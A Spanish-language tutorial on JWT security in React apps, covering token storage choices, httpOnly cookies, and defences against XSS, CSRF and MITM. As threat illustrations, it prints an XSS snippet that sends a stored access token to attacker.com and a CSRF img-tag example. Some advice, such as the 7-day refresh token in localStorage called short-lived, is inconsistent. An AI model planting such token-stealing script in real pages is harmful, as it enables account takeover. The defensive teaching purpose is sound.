# JWT Security - Almacenamiento Seguro y Protección

Guía de seguridad para tokens JWT en aplicaciones React, incluyendo almacenamiento seguro, protección contra XSS/CSRF y mejores prácticas.

## Estructura de JWT

### Anatomía de un JWT

```
Header.Payload.Signature
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Claims):**
```json
{
  "sub": "1234567890",      // Subject (user ID)
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,        // Issued at (timestamp)
  "exp": 1516242622         // Expiration (timestamp)
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### Decodificar JWT en Cliente

```tsx
// src/utils/jwt.ts
interface JWTPayload {
  sub: string;
  name: string;
  email: string;
  role: string;
  iat: number;
  exp: number;
}

export const decodeJWT = (token: string): JWTPayload | null => {
  try {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(
      atob(base64)
        .split('')
        .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
        .join('')
    );

    return JSON.parse(jsonPayload);
  } catch (error) {
    console.error('Invalid JWT:', error);
    return null;
  }
};

export const isTokenExpired = (token: string): boolean => {
  const decoded = decodeJWT(token);
  if (!decoded) return true;

  const currentTime = Date.now() / 1000;
  return decoded.exp < currentTime;
};

export const getTokenExpiration = (token: string): Date | null => {
  const decoded = decodeJWT(token);
  if (!decoded) return null;

  return new Date(decoded.exp * 1000);
};
```

### Validar Token

```tsx
// src/utils/tokenValidator.ts
export const validateToken = (token: string): boolean => {
  if (!token) return false;

  // 1. Verificar formato (3 partes separadas por puntos)
  const parts = token.split('.');
  if (parts.length !== 3) return false;

  // 2. Verificar que no esté expirado
  if (isTokenExpired(token)) return false;

  // 3. Verificar estructura del payload
  const payload = decodeJWT(token);
  if (!payload || !payload.sub || !payload.exp) return false;

  return true;
};
```

## Almacenamiento de Tokens

### Comparativa de Opciones

#### 1. localStorage (⚠️ No Recomendado para Production)

```tsx
// src/utils/storage/localStorage.ts

// ❌ VULNERABLE A XSS ATTACKS
export const tokenStorage = {
  setToken: (token: string) => {
    localStorage.setItem('accessToken', token);
  },

  getToken: (): string | null => {
    return localStorage.getItem('accessToken');
  },

  removeToken: () => {
    localStorage.removeItem('accessToken');
  },
};

// Problema: Si hay script malicioso en la página, puede robar tokens
// <script>
//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'))
// </script>
```

**Pros:**
- ✅ Simple de implementar
- ✅ Persiste entre sesiones
- ✅ Fácil de debuggear

**Contras:**
- ❌ Vulnerable a XSS (Cross-Site Scripting)
- ❌ Accesible desde cualquier script en la página
- ❌ No se puede configurar expiration automático

#### 2. sessionStorage (⚠️ No Recomendado)

```tsx
// Similar a localStorage pero se limpia al cerrar tab

export const sessionTokenStorage = {
  setToken: (token: string) => {
    sessionStorage.setItem('accessToken', token);
  },

  getToken: (): string | null => {
    return sessionStorage.getItem('accessToken');
  },

  removeToken: () => {
    sessionStorage.removeItem('accessToken');
  },
};
```

**Pros:**
- ✅ Se limpia automáticamente al cerrar tab
- ✅ Más seguro que localStorage (sesión temporal)

**Contras:**
- ❌ Aún vulnerable a XSS
- ❌ Mala UX (usuario tiene que re-loguearse cada vez que abre nueva tab)

#### 3. httpOnly Cookies (✅ Recomendado para Production)

```tsx
// Backend setup (Express ejemplo)
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  // Validar credentials
  const user = await authenticateUser(email, password);

  // Generar tokens
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Enviar tokens como httpOnly cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,        // No accesible desde JavaScript
    secure: true,          // Solo HTTPS
    sameSite: 'strict',    // Protección CSRF
    maxAge: 15 * 60 * 1000, // 15 minutos
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
  });

  res.json({ user });
});

// Frontend - axios config
import axios from 'axios';

const api = axios.create({
  baseURL: 'http://localhost:3000/api',
  withCredentials: true, // IMPORTANTE: Enviar cookies automáticamente
});

// Las cookies se envían automáticamente, no necesitas agregarlas manualmente
```

**Pros:**
- ✅ **Seguro contra XSS** (JavaScript no puede acceder)
- ✅ Cookies se envían automáticamente en requests
- ✅ Configuración de expiration automática
- ✅ Protección CSRF con sameSite

**Contras:**
- ⚠️ Requiere configuración en backend
- ⚠️ Más complejo de debuggear
- ⚠️ Requiere CORS configuration

#### 4. Memory (React State) + Refresh Token

```tsx
// src/contexts/AuthContext.tsx
// Mejor enfoque: Token en memoria + refresh token en localStorage

export const AuthProvider = ({ children }: { children: ReactNode }) => {
  // Access token SOLO en memoria (no persiste)
  const [accessToken, setAccessToken] = useState<string | null>(null);
  const [user, setUser] = useState<User | null>(null);

  // Verificar sesión al montar
  useEffect(() => {
    const initAuth = async () => {
      const refreshToken = localStorage.getItem('refreshToken');
      if (refreshToken) {
        try {
          // Usar refresh token para obtener nuevo access token
          const response = await fetch('/api/auth/refresh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken }),
          });

          const data = await response.json();
          setAccessToken(data.accessToken); // Solo en memoria
          setUser(data.user);
        } catch (error) {
          localStorage.removeItem('refreshToken');
        }
      }
      setIsLoading(false);
    };

    initAuth();
  }, []);

  const login = async (credentials: LoginCredentials) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials),
    });

    const data = await response.json();

    // Access token en memoria (se pierde al recargar)
    setAccessToken(data.accessToken);
    setUser(data.user);

    // Refresh token en localStorage (persiste)
    localStorage.setItem('refreshToken', data.refreshToken);
  };

  const logout = () => {
    setAccessToken(null);
    setUser(null);
    localStorage.removeItem('refreshToken');
  };

  // ...
};
```

**Pros:**
- ✅ **Muy seguro** (access token en memoria, no accesible a XSS)
- ✅ Refresh token puede robar si hay XSS, pero tiene vida corta
- ✅ Balance entre seguridad y UX

**Contras:**
- ⚠️ Access token se pierde al recargar página (se regenera con refresh)
- ⚠️ Más complejo de implementar

### Recomendación por Caso de Uso

| Caso de Uso | Recomendación | Razón |
|-------------|---------------|-------|
| **Prototipo/MVP** | localStorage | Rápido de implementar, fácil de debuggear |
| **Production SPA** | httpOnly Cookies | Máxima seguridad, estándar de la industria |
| **High Security App** | Memory + Refresh Token | Balance perfecto seguridad/UX |
| **Mobile App (React Native)** | Secure Storage (Keychain/Keystore) | Específico para mobile |

## Protección contra Ataques

### XSS (Cross-Site Scripting)

**¿Qué es XSS?**
Inyección de scripts maliciosos en la aplicación.

```html
<!-- Ejemplo de XSS attack -->
<script>
  // Script malicioso roba token
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'));
</script>
```

**Protección:**

1. **Usar httpOnly cookies** (JavaScript no puede acceder)
2. **Sanitizar inputs del usuario**

```tsx
import DOMPurify from 'dompurify';

// Sanitizar HTML antes de renderizar
const sanitizeHTML = (html: string): string => {
  return DOMPurify.sanitize(html);
};

// Uso en componente
function UserProfile({ bio }: { bio: string }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: sanitizeHTML(bio) }}
    />
  );
}
```

3. **Content Security Policy (CSP)**

```html
<!-- En index.html -->
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
  "
/>
```

### CSRF (Cross-Site Request Forgery)

**¿Qué es CSRF?**
Atacante engaña al navegador para hacer request autenticado sin consentimiento.

```html
<!-- Página maliciosa: attacker.com/evil.html -->
<img src="https://yourapp.com/api/delete-account" />

<!-- Si el usuario tiene sesión activa, el request se ejecuta automáticamente -->
```

**Protección:**

1. **SameSite Cookies**

```tsx
// Backend
res.cookie('accessToken', token, {
  httpOnly: true,
  sameSite: 'strict', // Solo enviar cookies en requests del mismo sitio
  secure: true,
});
```

2. **CSRF Tokens** (si usas cookies)

```tsx
// Backend genera CSRF token
app.post('/api/auth/login', (req, res) => {
  const csrfToken = generateCSRFToken();

  res.cookie('XSRF-TOKEN', csrfToken, {
    httpOnly: false, // JavaScript necesita leerlo
    sameSite: 'strict',
  });

  res.json({ user, csrfToken });
});

// Frontend envía CSRF token en header
api.interceptors.request.use((config) => {
  const csrfToken = getCookie('XSRF-TOKEN');
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});
```

3. **Verificar Origin header**

```tsx
// Backend
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://yourapp.com', 'http://localhost:3000'];

  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

### Man-in-the-Middle (MITM)

**Protección:**

1. **SIEMPRE usar HTTPS en production**

```tsx
// Forzar HTTPS en React app
if (window.location.protocol !== 'https:' && process.env.NODE_ENV === 'production') {
  window.location.href = `https:${window.location.href.substring(window.location.protocol.length)}`;
}
```

2. **HSTS Header** (backend)

```tsx
// Backend - Strict Transport Security
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});
```

## Token Expiration Strategy

### Short-Lived Access Tokens

```tsx
// Backend - Generar access token (5-15 minutos)
const generateAccessToken = (user: User): string => {
  return jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
    },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' } // 15 minutos
  );
};

// Frontend - Verificar expiration antes de usar
const useTokenExpiration = () => {
  const { accessToken, logout } = useAuth();

  useEffect(() => {
    if (!accessToken) return;

    const checkExpiration = () => {
      if (isTokenExpired(accessToken)) {
        console.log('Token expired, logging out');
        logout();
      }
    };

    // Check cada minuto
    const interval = setInterval(checkExpiration, 60000);
    return () => clearInterval(interval);
  }, [accessToken, logout]);
};
```

### Auto-Logout en Inactividad

```tsx
// src/hooks/useIdleLogout.ts
import { useEffect, useRef } from 'react';
import { useAuth } from '../contexts/AuthContext';

export const useIdleLogout = (timeoutMinutes: number = 30) => {
  const { logout, isAuthenticated } = useAuth();
  const timeoutRef = useRef<NodeJS.Timeout>();

  useEffect(() => {
    if (!isAuthenticated) return;

    const resetTimer = () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }

      timeoutRef.current = setTimeout(() => {
        console.log('User inactive, logging out');
        logout();
      }, timeoutMinutes * 60 * 1000);
    };

    // Events que resetean el timer
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];

    events.forEach((event) => {
      window.addEventListener(event, resetTimer);
    });

    resetTimer(); // Initial timer

    return () => {
      events.forEach((event) => {
        window.removeEventListener(event, resetTimer);
      });
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
    };
  }, [isAuthenticated, logout, timeoutMinutes]);
};

// Uso en App
function App() {
  useIdleLogout(30); // Logout después de 30min de inactividad

  return <Routes>...</Routes>;
}
```

## Mejores Prácticas

### ✅ Seguridad

1. **NUNCA guardar passwords en state o localStorage**
2. **Usar HTTPS siempre en production**
3. **Access tokens cortos (5-15min) + Refresh tokens largos (7 días)**
4. **httpOnly cookies o Memory + Refresh Token**
5. **Sanitizar todos los inputs del usuario**
6. **Implementar rate limiting en endpoints de auth (backend)**
7. **Validar tokens en backend en cada request**
8. **Logout al detectar token manipulation**

### ✅ UX

1. **Mostrar loading state durante verificación de token**
2. **Auto-redirect a login si token expira**
3. **Refresh token silencioso (sin interrumpir UX)**
4. **Mensajes de error claros (credenciales inválidas vs network error)**
5. **Remember me checkbox (opcional, ajusta refresh token expiration)**

### ✅ Performance

1. **Memoizar funciones de auth con useCallback**
2. **Evitar re-renders innecesarios de AuthContext**
3. **Lazy load rutas protegidas**
4. **Cache de user data con TanStack Query**

---

**Resumen:** Para production, usar httpOnly cookies (si backend lo soporta) o Memory + Refresh Token pattern. Siempre HTTPS, tokens cortos, sanitizar inputs y proteger contra XSS/CSRF.
